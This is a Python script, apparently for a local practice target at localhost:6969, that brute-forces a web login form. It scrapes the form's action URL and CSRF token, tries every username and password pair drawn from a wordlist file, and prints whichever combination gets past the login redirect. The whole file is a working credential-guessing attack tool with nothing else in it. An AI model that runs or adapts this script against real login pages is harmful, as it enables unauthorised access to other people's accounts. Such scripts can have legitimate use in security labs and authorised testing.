import requests
import hashlib
from bs4 import BeautifulSoup

base_url = 'http://localhost:6969'
login_url = f'{base_url}/login.php'

wordlist_file = 'wordlist.txt'
wordlist = []

session = None
login_action_url = ''
csrf = ''

def main():
    global session, csrf, login_action_url

    init_wordlist()

    session = requests.Session()

    response = session.get(login_url)
    soup = BeautifulSoup(response.content, 'html.parser')
    
    # get action attribute from login form
    # can definitely be hard inputted, but you can do it like this if you want to automate this process
    login_action = soup.find('form')['action']
    login_action_url = f'{base_url}{login_action}'

    csrf = soup.find("input", {'name': '_token'})['value']

    result = brute_force()

    if result == None:
        print('Brute force failed')
    else:
        print('\nBrute force succeeded')
        print(f'Username: {result[0]}, password: {result[1]}')

def brute_force():
    for word1 in wordlist:
        for word2 in wordlist:
            payload = {
                'username': word1,
                'password': word2,
                '_token': csrf
            }

            response = session.post(login_action_url, data=payload)

            if response.url == login_url:
                # auth failed
                print(f'Combination of {word1} and {word2} failed')
            else:
                # auth succeeded
                print(f'Combination of {word1} and {word2} succeeded')
                return word1, word2
    
    return None

def init_wordlist():
    global wordlist

    filelist = open(wordlist_file, 'r')
    for file in filelist:
        wordlist.append(file.strip("\n"))
    filelist.close()

if __name__ == "__main__":
    main()